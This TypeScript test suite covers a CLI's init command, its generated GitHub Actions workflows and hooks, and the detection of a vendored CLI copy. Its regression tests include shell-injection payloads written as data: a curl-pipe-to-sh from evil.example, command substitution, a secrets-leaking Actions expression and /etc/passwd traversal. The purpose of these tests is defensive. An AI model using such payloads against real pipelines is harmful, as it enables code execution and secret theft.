import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, relative } from 'node:path'
import { DOC_OWNERS_PATH } from '@atta/aeg-core'
import {
  ARCHIVIST_WORKFLOW_PATH,
  buildInitOps,
  CHECKS_WORKFLOW_PATH,
  CONFIG_PATH,
  DOCTRINE_POINTER_PATH,
  REVIEW_WORKFLOW_PATH,
  REVIEW_VERDICT_WORKFLOW_PATH,
  SETUP_BUN_SHA,
  starterConfig
} from '../src/lib/artifacts.js'
import type { VendoredVinaya } from '../src/lib/self-host.js'
import { detectVendoredVinaya } from '../src/lib/self-host.js'
import type { InitDeps } from '../src/commands/init.js'
import { runInit, runInitProduct } from '../src/commands/init.js'
import { runEject } from '../src/commands/eject.js'
import type { EjectDeps } from '../src/commands/eject.js'
import type { LabelGateway } from '../src/lib/ops.js'

let root: string
let createdLabels: string[]

function makeDeps(overrides: Partial<InitDeps> = {}): InitDeps {
  const labels: LabelGateway = {
    async exists() {
      return false
    },
    async create(name) {
      createdLabels.push(name)
    }
  }
  return {
    detectRepo: async () => ({ repoRoot: root, owner: 'acme', repo: 'widget' }),
    checkGhAuth: async () => true,
    labelGateway: () => labels,
    hookDirFor: () => '.husky',
    customHooksPath: async () => null,
    confirm: async () => true,
    ...overrides
  }
}

function ejectDeps(overrides: Partial<EjectDeps> = {}): EjectDeps {
  return {
    detectRepo: async () => ({ repoRoot: root, owner: 'acme', repo: 'widget' }),
    confirm: async () => true,
    ...overrides
  }
}

/** Recursive snapshot of the fixture tree: relative path → content. */
function snapshot(dir: string): Map<string, string> {
  const out = new Map<string, string>()
  const walk = (d: string) => {
    for (const name of readdirSync(d)) {
      const p = join(d, name)
      if (statSync(p).isDirectory()) walk(p)
      else out.set(relative(dir, p), readFileSync(p, 'utf-8'))
    }
  }
  walk(dir)
  return out
}

/** Capture process.stdout.write output during `fn`, returning the output. */
async function captureStdout(fn: () => Promise<unknown>): Promise<string> {
  const original = process.stdout.write.bind(process.stdout)
  let buf = ''
  process.stdout.write = ((chunk: string) => {
    buf += chunk
    return true
  }) as typeof process.stdout.write
  try {
    await fn()
  } finally {
    process.stdout.write = original
  }
  return buf
}

beforeEach(() => {
  root = join(tmpdir(), `vinaya-init-${Date.now()}-${Math.random().toString(36).slice(2)}`)
  mkdirSync(root, { recursive: true })
  // A pre-existing adopter file that must survive init and eject untouched.
  writeFileSync(join(root, 'README.md'), '# widget\n')
  createdLabels = []
})

afterEach(() => {
  rmSync(root, { recursive: true, force: true })
})

describe('vinaya init', () => {
  it('installs exactly the 6-item minimal manifest on a clean repo', async () => {
    let rc = -1
    await captureStdout(async () => {
      rc = await runInit(['--yes'], makeDeps())
    })
    expect(rc).toBe(0)

    // The minimal manifest (2026-07-23 re-ruling, +doc-owners #665; the
    // workflows item grew to three with the archivist workflow #761, and to
    // four with the review-verdict workflow — the comment half of the review
    // gate split into its own file so verdict comments can re-trigger the
    // required run): config + root VINAYA.md + four workflows (tracked) +
    // two hook stubs + the .vinaya/doc-owners starter. Nothing else is
    // written.
    for (const p of [
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      REVIEW_VERDICT_WORKFLOW_PATH,
      ARCHIVIST_WORKFLOW_PATH,
      '.husky/pre-commit',
      '.husky/pre-push',
      DOC_OWNERS_PATH
    ]) {
      expect(existsSync(join(root, p))).toBe(true)
    }
    expect(DOCTRINE_POINTER_PATH).toBe('VINAYA.md') // root placement, not governance/

    // Exhaustiveness: NOTHING outside the manifest lands. The cut artifacts
    // (governance/, GitHub templates, example scripts) must be absent.
    const tree = new Set(snapshot(root).keys())
    const expected = new Set([
      'README.md', // pre-existing adopter file
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      REVIEW_VERDICT_WORKFLOW_PATH,
      ARCHIVIST_WORKFLOW_PATH,
      '.husky/pre-commit',
      '.husky/pre-push',
      DOC_OWNERS_PATH
    ])
    expect(tree).toEqual(expected)
    for (const gone of [
      'governance',
      'scripts/vinaya-checks',
      '.github/ISSUE_TEMPLATE/vinaya-task.md',
      '.github/pull_request_template.md'
    ]) {
      expect(existsSync(join(root, gone))).toBe(false)
    }

    // labels created-if-absent
    expect(createdLabels).toContain('vinaya/tier:0')
    expect(createdLabels).toContain('vinaya/needs:principal-input')
    // starter config ships no example checks (empty `checks`)
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.checks).toEqual({})
    // manifest recorded in config
    expect(cfg.managed.version).toBe(1)
    expect(cfg.managed.files).toContain(CHECKS_WORKFLOW_PATH)
    expect(cfg.managed.files).toContain(DOCTRINE_POINTER_PATH)
    expect(cfg.managed.blocks.some((b: { path: string }) => b.path === '.husky/pre-commit')).toBe(true)
    // hooks are executable
    expect(statSync(join(root, '.husky/pre-commit')).mode & 0o111).not.toBe(0)
  })

  it('hook stubs pin the exact installed version with --yes (npx cache-key regression)', () => {
    // A bare/`@latest`-spec npx cache entry does not satisfy `--no-install
    // @attalabs/vinaya` — on a fresh machine the first commit after init died
    // on npx's non-interactive cancel. The exact-version `--yes` pin is the
    // fix; this locks it.
    const pkg = JSON.parse(readFileSync(join(import.meta.dir, '..', 'package.json'), 'utf-8')) as { version: string }
    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null }).filter(
      (op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path)
    )
    expect(hookOps.length).toBe(2)
    for (const op of hookOps) {
      if (op.kind !== 'managed-block') continue
      expect(op.body).toContain(`npx --yes @attalabs/vinaya@${pkg.version} check`)
      expect(op.body).not.toContain('--no-install')
    }
  })

  it('both hook stubs pass --local — neither can satisfy a requiresOpenPr check before a PR exists', () => {
    // The bootstrap-deadlock fix: closes-n/test-plan need an open PR's real
    // body, and neither the commit nor the push that precedes opening one can
    // supply it. Found live: the first commit on a fresh task branch could
    // never land, because the generated pre-commit hook ran every check
    // unconditionally. `vinaya-checks.yml` (CI, pull_request-triggered) is
    // deliberately NOT asserted here — it must omit --local so these checks
    // run for real once a PR exists.
    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null }).filter(
      (op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path)
    )
    expect(hookOps.length).toBe(2)
    for (const op of hookOps) {
      if (op.kind !== 'managed-block') continue
      expect(op.body).toContain('check --all')
      expect(op.body).toContain('--local')
    }
  })

  it('--dry-run writes nothing but shows the exact content install would write', async () => {
    const before = snapshot(root)
    const out = await captureStdout(() => runInit(['--dry-run'], makeDeps()))
    const after = snapshot(root)
    expect(after).toEqual(before) // nothing written
    // dry-run diff shows the exact bytes a real install writes
    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null })) {
      if (op.kind === 'create-file') expect(out).toContain(op.content.trimEnd().split('\n')[0] ?? '')
    }
    expect(out).toContain('nothing was written')
  })

  it('dry-run output byte-matches what install then writes (content artifacts)', async () => {
    await runInit(['--yes'], makeDeps())
    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null })) {
      // vinaya.config.json is the one file whose bytes legitimately differ: the
      // ownership `managed` manifest is injected at apply time. Every other
      // create-file artifact is byte-identical to what the diff showed.
      if (op.kind === 'create-file' && op.path !== CONFIG_PATH) {
        expect(readFileSync(join(root, op.path), 'utf-8')).toBe(op.content)
      }
    }
    // config: seed portion is exactly the starter ruleset; only `managed` is added.
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    const { managed, ...seed } = cfg
    expect(managed).toBeDefined()
    expect(seed).toEqual(starterConfig() as unknown as typeof seed)
  })

  it('aborting the confirmation writes nothing and exits clean', async () => {
    const before = snapshot(root)
    const rc = await runInit([], makeDeps({ confirm: async () => false }))
    expect(rc).toBe(0)
    expect(snapshot(root)).toEqual(before)
  })

  it('refuses without gh auth unless --dry-run', async () => {
    const rc = await runInit(['--yes'], makeDeps({ checkGhAuth: async () => false }))
    expect(rc).toBe(1)
    expect(existsSync(join(root, CONFIG_PATH))).toBe(false)
  })

  it('stops on a custom core.hooksPath rather than guessing', async () => {
    const rc = await runInit(['--yes'], makeDeps({ customHooksPath: async () => '.config/hooks' }))
    expect(rc).toBe(1)
    expect(existsSync(join(root, CONFIG_PATH))).toBe(false)
  })
})

describe('remoteless graceful-skip (spec D3)', () => {
  it('warns, skips labels, and still installs + prints the summary — no gh-auth requirement either', async () => {
    let ghAuthCalled = false
    const deps = makeDeps({
      detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }),
      checkGhAuth: async () => {
        ghAuthCalled = true
        return false // would fail the run if it were ever consulted
      }
    })

    let rc = -1
    const out = await captureStdout(async () => {
      rc = await runInit(['--yes'], deps)
    })

    expect(ghAuthCalled).toBe(false)
    expect(rc).toBe(0)
    expect(out).toContain('Vinaya installed')
    expect(out).not.toContain('vinaya/tier:0') // no label ops rendered

    // everything except labels still installed
    for (const p of [
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      '.husky/pre-commit'
    ]) {
      expect(existsSync(join(root, p))).toBe(true)
    }
    expect(createdLabels).toEqual([])
  })

  it('init product skips only the label (the one forge-reaching op) — the registry write is a pure local file op and still happens', async () => {
    await runInit(['--yes'], makeDeps())
    createdLabels = []
    const rc = await runInitProduct(
      ['mobile', '--yes'],
      makeDeps({ detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }) })
    )
    expect(rc).toBe(0)
    expect(createdLabels).toEqual([])
    expect(existsSync(join(root, '.vinaya/projects.md'))).toBe(true)
    expect(readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')).toContain('| mobile |')
  })
})

describe('never-clobber', () => {
  it('appends to a pre-existing hook and REFUSES a foreign workflow + root VINAYA.md', async () => {
    mkdirSync(join(root, '.husky'), { recursive: true })
    writeFileSync(join(root, '.husky/pre-commit'), '#!/usr/bin/env sh\nnpm run lint\n')
    mkdirSync(join(root, '.github/workflows'), { recursive: true })
    writeFileSync(join(root, CHECKS_WORKFLOW_PATH), 'name: not-ours\n')
    // A pre-existing root VINAYA.md is the new refuse-if-foreign collision case
    // (it replaces the PR-template collision the old manifest carried).
    writeFileSync(join(root, DOCTRINE_POINTER_PATH), '# my own notes\n')

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    // hook: adopter line kept, managed block appended
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('npm run lint')
    expect(hook).toContain('vinaya:managed:pre-commit')
    // foreign checks workflow: untouched, and REFUSE shown in the diff
    expect(readFileSync(join(root, CHECKS_WORKFLOW_PATH), 'utf-8')).toBe('name: not-ours\n')
    expect(out).toContain('REFUSE')
    expect(out).toContain(CHECKS_WORKFLOW_PATH)
    // foreign root VINAYA.md: untouched, and REFUSE shown in the diff
    expect(readFileSync(join(root, DOCTRINE_POINTER_PATH), 'utf-8')).toBe('# my own notes\n')
    expect(out).toContain(DOCTRINE_POINTER_PATH)
    // the non-foreign review workflow still installs
    expect(existsSync(join(root, REVIEW_WORKFLOW_PATH))).toBe(true)
  })

  it('REFUSES a foreign .vinaya/doc-owners rather than overwriting it', async () => {
    mkdirSync(join(root, '.vinaya'), { recursive: true })
    writeFileSync(join(root, DOC_OWNERS_PATH), '# adopter-authored bindings\napp/** docs/app.md\n')

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    expect(readFileSync(join(root, DOC_OWNERS_PATH), 'utf-8')).toBe('# adopter-authored bindings\napp/** docs/app.md\n')
    expect(out).toContain('REFUSE')
    expect(out).toContain(DOC_OWNERS_PATH)
  })
})

describe('workflows', () => {
  it('splits the review gate: required half on pull_request only, verdict half on issue_comment', async () => {
    await runInit(['--yes'], makeDeps())
    const checks = readFileSync(join(root, CHECKS_WORKFLOW_PATH), 'utf-8')
    const review = readFileSync(join(root, REVIEW_WORKFLOW_PATH), 'utf-8')
    const verdict = readFileSync(join(root, REVIEW_VERDICT_WORKFLOW_PATH), 'utf-8')
    expect(checks).toContain('pull_request')
    expect(checks).not.toContain('issue_comment')
    // Required half: pull_request only — no comment path, so its runs never
    // list permanently-skipped comment jobs.
    expect(review).toContain('pull_request')
    expect(review).not.toContain('issue_comment')
    // Verdict half: comment-triggered, VERDICT-guarded before checkout cost,
    // evaluator holds no write permission, retrigger re-runs the required run.
    expect(verdict).toContain('issue_comment')
    expect(verdict).toContain('VERDICT')
    expect(verdict).toContain('actions: write')
    expect(verdict).toContain('gh run rerun')
    expect(verdict).toContain('vinaya-review.yml')
    expect(checks).toContain('vinaya check --all --diff-only')
    // PR_NUMBER wiring is what makes the review-gate adapter EVALUATE —
    // without it the check reads "local dev" and exits 0 unconditionally,
    // a vacuous gate (PR #813 review blocker). Guard all three PR-facing
    // workflows.
    expect(review).toContain('PR_NUMBER')
    expect(checks).toContain('PR_NUMBER')
    expect(verdict).toContain('PR_NUMBER')
    expect(verdict).toContain('steps.pr.outputs.number')
    // PR_BODY wiring is what makes test-plan/closes-n EVALUATE — neither
    // fetches the body itself, both read `process.env.PR_BODY` only, so an
    // unwired job passes them vacuously regardless of the PR's real content
    // (found live: reproduced against a real adopter repo's real CI run).
    // The checks job runs `check --all --diff-only` (test-plan/closes-n
    // included) and needs it; the review job runs only `check review-gate`
    // now (#870), which never reads PR_BODY, so it must NOT carry this wiring
    // — re-adding it would regress to the exact bug this fix closes.
    expect(checks).toContain('github.event.pull_request.body')
    expect(review).not.toContain('github.event.pull_request.body')
    // review-gate is the review job's sole check (#870) — decoupled from the
    // PR_BODY-driven check --all it used to run.
    expect(review).toContain('vinaya check review-gate')
    expect(review).not.toContain('vinaya check --all')
    // A body-only edit must re-trigger the checks workflow so test-plan/
    // closes-n re-evaluate against the corrected body (#870).
    expect(checks).toContain('edited')
  })
})

// atta-labs/attalabs#929. In a repo whose workspaces glob reaches a member named
// `@attalabs/vinaya`, npm resolves `npx --yes @attalabs/vinaya` to that local
// member — the decision is made on the package NAME, before any version spec is
// read — and execs its unbuilt `bin`, so every generated job died with `sh:
// vinaya: command not found`. Both shapes are asserted here: a test that only
// asserted the old string was asserting the defect.
describe('generated workflows: published vs vendored invocation (atta-labs/attalabs#929)', () => {
  const WORKFLOWS = [CHECKS_WORKFLOW_PATH, REVIEW_WORKFLOW_PATH, REVIEW_VERDICT_WORKFLOW_PATH, ARCHIVIST_WORKFLOW_PATH]
  const VENDORED_BIN = 'node apps/cli/dist/index.js'

  /** Make the fixture a repo that vendors the CLI as a workspace member. */
  function vendorVinaya(dir = 'apps/cli'): void {
    writeFileSync(
      join(root, 'package.json'),
      `${JSON.stringify({ name: 'vinaya', private: true, workspaces: ['apps/*', 'packages/*'] }, null, 2)}\n`
    )
    mkdirSync(join(root, dir), { recursive: true })
    writeFileSync(
      join(root, dir, 'package.json'),
      `${JSON.stringify(
        {
          name: '@attalabs/vinaya',
          version: '0.4.6',
          bin: { vinaya: './dist/index.js' },
          scripts: { build: 'bun scripts/build.ts' }
        },
        null,
        2
      )}\n`
    )
  }

  function generated(): Map<string, string> {
    return new Map(WORKFLOWS.map((p) => [p, readFileSync(join(root, p), 'utf-8')]))
  }

  /**
   * One `KEY: ${{ expression }}` env line. Assembled from `SIGIL` rather than
   * written inline so the literals here carry no `${`, which reads as a broken
   * JS template to the linter.
   */
  const SIGIL = '$'
  function expr(key: string, expression: string): string {
    return `${key}: ${SIGIL}{{ ${expression} }}`
  }

  function occurrences(files: Map<string, string>, needle: string): number {
    let n = 0
    for (const content of files.values()) n += content.split(needle).length - 1
    return n
  }

  it('ordinary adopter: published npx invocation everywhere, and NO build step', async () => {
    // The constraint: an adopter has no local copy to build and must not pay
    // for a problem they do not have.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    expect(occurrences(files, 'npx --yes @attalabs/vinaya ')).toBe(6)
    expect(occurrences(files, 'node apps/cli/dist/index.js')).toBe(0)
    for (const content of files.values()) {
      expect(content).not.toContain('setup-bun')
      expect(content).not.toContain('bun install')
      expect(content).not.toContain('Build the vendored Vinaya CLI')
    }
  })

  it('the verdict retrigger fires on BOTH verdicts — the gate must close, not only open', async () => {
    // The required check stores a conclusion, and that stored conclusion
    // guards the merge button. Gating the retrigger on a clean evaluation
    // made it one-way: an APPROVE turned the check green, and a later
    // REQUEST CHANGES re-ran nothing, so it kept reporting green while the
    // PR stayed mergeable. Measured on this repo's own PR #6 — 52 minutes.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const verdict = generated().get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

    expect(verdict).not.toContain("needs.evaluate.result == 'success'")
    expect(verdict).toContain("!cancelled() && needs.evaluate.result != 'skipped'")
    // The output it consumes must be resolved before any repo content is
    // checked out, or a failed evaluation would leave it empty.
    expect(verdict.indexOf('id: pr')).toBeLessThan(verdict.indexOf('actions/checkout@v4'))

    // ...and it can still be empty, because running on a failed evaluation
    // makes `Resolve PR head`'s own failure reachable here for the first
    // time. `gh run list --branch ""` drops the filter and matches every
    // branch, so an unguarded rerun lands on an unrelated PR's gate.
    expect(verdict).toContain('if [ -z "$BRANCH" ]')
    expect(verdict.indexOf('if [ -z "$BRANCH" ]')).toBeLessThan(verdict.indexOf('gh run list'))
  })

  it('ordinary adopter: gains the credential opt-out, and no vendored token', async () => {
    // The adopter shape emits `persist-credentials: false` on all 6 of its
    // checkouts and nothing vendored. The opt-out is deliberate rather than
    // incidental: the checkout default writes GITHUB_TOKEN into .git/config,
    // and no generated job pushes, so no job needs it. Asserted here because
    // an adopter regenerates these files on `upgrade` — a silent change to
    // the adopter shape reaches every install.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    for (const [path, content] of files) {
      if (!content.includes('actions/checkout@v4')) continue
      const checkouts = content.split('actions/checkout@v4').length - 1
      const optOuts = content.split('persist-credentials: false').length - 1
      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
    }

    // Everything the vendored shape adds stays absent — the adopter still
    // pays nothing for a problem it does not have.
    for (const content of files.values()) {
      expect(content).not.toContain('setup-bun')
      expect(content).not.toContain('--ignore-scripts')
      expect(content).not.toContain('Build the vendored Vinaya CLI')
    }
  })

  it('vendoring repo: the build job is hardened — pinned action, no scripts, no creds', async () => {
    // Each of these is a security review finding, and each is invisible to a
    // test that only checks the invocation moved.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    // The first THIRD-PARTY action this generator writes into an adopter repo,
    // in the job that then builds and runs PR code: pinned to a commit, so a
    // repoint of the mutable tag cannot execute new upstream code everywhere.
    expect(occurrences(files, 'oven-sh/setup-bun@v2')).toBe(0)
    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)

    // The install runs against the PR's own dependency manifest.
    expect(occurrences(files, 'bun install --frozen-lockfile --ignore-scripts')).toBe(6)
    expect(occurrences(files, 'bun install --frozen-lockfile\n')).toBe(0)

    // Default checkout writes GITHUB_TOKEN into .git/config as an http
    // extraheader — in the same workspace the build then executes.
    for (const [path, content] of files) {
      if (!content.includes('actions/checkout@v4')) continue
      const checkouts = content.split('actions/checkout@v4').length - 1
      const optOuts = content.split('persist-credentials: false').length - 1
      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
    }
  })

  it('vendoring repo: builds and invokes its OWN CLI by path, never npx', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    // All six invocations move — none left on the broken path.
    expect(occurrences(files, 'npx --yes @attalabs/vinaya')).toBe(0)
    expect(occurrences(files, VENDORED_BIN)).toBe(6)
    // Every job carrying an invocation first builds the member it invokes.
    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)
    expect(occurrences(files, 'bun run --cwd apps/cli build')).toBe(6)

    // Per-file: the exact subcommands, in the built-binary shape.
    const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
    const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
    const archivist = files.get(ARCHIVIST_WORKFLOW_PATH) ?? ''
    expect(checks).toContain(`${VENDORED_BIN} check --all --diff-only`)
    expect(review).toContain(`${VENDORED_BIN} check review-gate`)
    expect(verdict).toContain(`${VENDORED_BIN} check review-gate`)
    expect(archivist).toContain(`${VENDORED_BIN} archive --merge-sha=${SIGIL}{{ github.sha }}`)
    expect(archivist).toContain(`${VENDORED_BIN} audit --only=dead-branches`)
    expect(archivist).toContain(`${VENDORED_BIN} audit --only=direct-push --sha=${SIGIL}{{ github.sha }}`)
    // The retrigger job executes no repo content and gains no build step.
    expect(occurrences(new Map([[ARCHIVIST_WORKFLOW_PATH, archivist]]), 'setup-bun')).toBe(3)
  })

  it('every env: wiring survives in BOTH shapes', async () => {
    // PR_BODY/PR_NUMBER are what make the checks EVALUATE rather than pass
    // vacuously; GH_TOKEN and BRANCH are load-bearing too. Changing how the
    // binary is reached must not drop any of them.
    for (const vendored of [false, true]) {
      rmSync(root, { recursive: true, force: true })
      mkdirSync(root, { recursive: true })
      if (vendored) vendorVinaya()
      await captureStdout(() => runInit(['--yes'], makeDeps()))
      const files = generated()
      const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
      const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
      const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

      expect(checks).toContain(expr('PR_BODY', 'github.event.pull_request.body'))
      expect(checks).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
      expect(checks).toContain(expr('BRANCH', 'github.head_ref'))
      expect(review).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
      expect(review).toContain(expr('BRANCH', 'github.head_ref'))
      expect(verdict).toContain(expr('PR_NUMBER', 'steps.pr.outputs.number'))
      expect(verdict).toContain(expr('BRANCH', 'steps.pr.outputs.branch'))
      // GH_TOKEN on every step that talks to the forge: checks 1, review 1,
      // verdict 3 (resolve-head, evaluate, retrigger), archivist 3.
      expect(occurrences(files, expr('GH_TOKEN', 'secrets.GITHUB_TOKEN'))).toBe(8)
    }
  })

  it('the hook stubs resolve the vendored bin too (atta-labs/attalabs#935 corrects this case)', async () => {
    // This test previously asserted the opposite — "a vendoring repo's hooks
    // stay exactly as they are" — which was #929's stated scope: workflows
    // only. That scope left the two hook emitters on the published spec, and
    // in a vendoring repo the published spec cannot resolve: npm matches the
    // package NAME against the local member and execs its unbuilt bin, so
    // `|| exit 1` blocked every commit and push. #935 is that remainder.
    // The version pin the old assertion protected is unrelated to this, and
    // still holds for the ordinary adopter — asserted below and in the two
    // `selfHost: null` hook tests above.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('node apps/cli/dist/index.js check')
    expect(hook).not.toContain('npx --yes')
  })
})

describe('detectVendoredVinaya', () => {
  it('is null for a repo with no package.json, no workspaces, or no such member', () => {
    expect(detectVendoredVinaya(root)).toBeNull() // bare fixture: README.md only

    writeFileSync(join(root, 'package.json'), '{ "name": "widget" }\n')
    expect(detectVendoredVinaya(root)).toBeNull() // no workspaces field

    writeFileSync(join(root, 'package.json'), '{ "name": "widget", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/web'), { recursive: true })
    writeFileSync(join(root, 'apps/web/package.json'), '{ "name": "@widget/web" }\n')
    expect(detectVendoredVinaya(root)).toBeNull() // a workspace, but not ours
  })

  it('never throws on a malformed root package.json — an adopter install must not die on it', () => {
    writeFileSync(join(root, 'package.json'), '{ not json at all\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('finds the member through a glob and honours its declared bin', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(
      join(root, 'apps/cli/package.json'),
      '{ "name": "@attalabs/vinaya", "bin": { "vinaya": "./dist/index.js" } }\n'
    )
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })
  })

  it('accepts the { packages: [...] } workspaces form and a non-default bin path', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": { "packages": ["tools/vinaya"] } }\n')
    mkdirSync(join(root, 'tools/vinaya'), { recursive: true })
    writeFileSync(join(root, 'tools/vinaya/package.json'), '{ "name": "@attalabs/vinaya", "bin": "build/cli.js" }\n')
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'tools/vinaya', bin: 'tools/vinaya/build/cli.js' })
  })

  // Both fields land in a workflow `run:` as bare shell words, and both come
  // from the target repo. Each payload below was reproduced end-to-end against
  // the unguarded version — these are regressions, not hypotheticals.
  const UNSAFE_BINS: Array<[string, string]> = [
    ['a command separator', 'dist/i.js; curl https://evil.example/s.sh | sh'],
    ['command substitution', 'dist/$(id).js'],
    ['backtick substitution', 'dist/`id`.js'],
    ['a newline, which injects an entire extra step', 'dist/i.js\n      - run: id'],
    // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax, deliberately a plain string — it is the payload
    ['an Actions expression, which reaches secrets', 'dist/i.js; echo ${{ secrets.NPM_TOKEN }}'],
    ['a pipe', 'dist/i.js | tee /tmp/x'],
    ['traversal out of the member', '../../../etc/passwd']
  ]

  for (const [label, bin] of UNSAFE_BINS) {
    it(`refuses a bin containing ${label} — falls back to the adopter shape`, () => {
      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
      mkdirSync(join(root, 'apps/cli'), { recursive: true })
      writeFileSync(
        join(root, 'apps/cli/package.json'),
        JSON.stringify({ name: '@attalabs/vinaya', bin: { vinaya: bin } })
      )
      expect(detectVendoredVinaya(root)).toBeNull()
    })
  }

  it('refuses an unsafe member directory even with no bin declared', () => {
    // `$(id)` is a legal directory name and `apps/*` matches it, so the
    // package.json need not be hostile at all.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/$(id)'), { recursive: true })
    writeFileSync(join(root, 'apps/$(id)/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('refuses a member reached by a traversing workspace pattern', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["../outside/*"] }\n')
    mkdirSync(join(root, '../outside/pkg'), { recursive: true })
    writeFileSync(join(root, '../outside/pkg/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    try {
      expect(detectVendoredVinaya(root)).toBeNull()
    } finally {
      rmSync(join(root, '../outside'), { recursive: true, force: true })
    }
  })

  it('refuses a member directory whose name starts with a dash', () => {
    // `-e` / `--eval` reach `node` in argument position. Node ACCEPTS a
    // detached value (`node -e 'code'` runs it) and rejects the attached
    // form, which is the only form the emitted single-token path can take —
    // see self-host.ts. So this breaks CI rather than executing, and the
    // property keeping it that way is not enforced anywhere else.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/-e'), { recursive: true })
    writeFileSync(join(root, 'apps/-e/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('accepts a scoped member directory — the shape this feature exists for', () => {
    // `@` is an ordinary directory character and means nothing to the shell.
    // Refusing it would degrade a scoped member into the broken `npx` shape.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*/*"] }\n')
    mkdirSync(join(root, 'packages/@attalabs/vinaya'), { recursive: true })
    writeFileSync(join(root, 'packages/@attalabs/vinaya/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toEqual({
      dir: 'packages/@attalabs/vinaya',
      bin: 'packages/@attalabs/vinaya/dist/index.js'
    })
  })

  it('collapses runs of stars before the bound counts them', () => {
    // Behavioural, not timed. A wall-clock assertion cannot see this: with
    // collapsing removed the worst shape costs ~248ms, under any threshold
    // loose enough to survive a loaded runner. Two earlier forms of this test
    // passed with the mechanism disabled for exactly that reason.
    //
    // Collapsing is a widening, and that is what makes it observable. Eight
    // ADJACENT stars exceed MAX_SEGMENT_STARS as typed and are refused; they
    // collapse to one star, which is the same glob, and resolve. Non-adjacent
    // stars survive collapsing and are still counted, so the bound is not
    // weakened — the second half asserts that.
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(join(root, 'apps/cli/package.json'), '{ "name": "@attalabs/vinaya" }\n')

    // 8 adjacent stars -> collapses to `c*i` -> matches
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c********i"] }\n')
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })

    // 8 separated stars -> collapsing changes nothing -> still over the bound.
    // The pattern MUST be one that would otherwise match: `c*l*i*x*y*z*w*v*q`
    // matches no directory either way, so it could not observe the bound.
    mkdirSync(join(root, 'apps/clixyzwvq'), { recursive: true })
    writeFileSync(join(root, 'apps/clixyzwvq/package.json'), '{ "name": "@attalabs/vinaya" }\n')
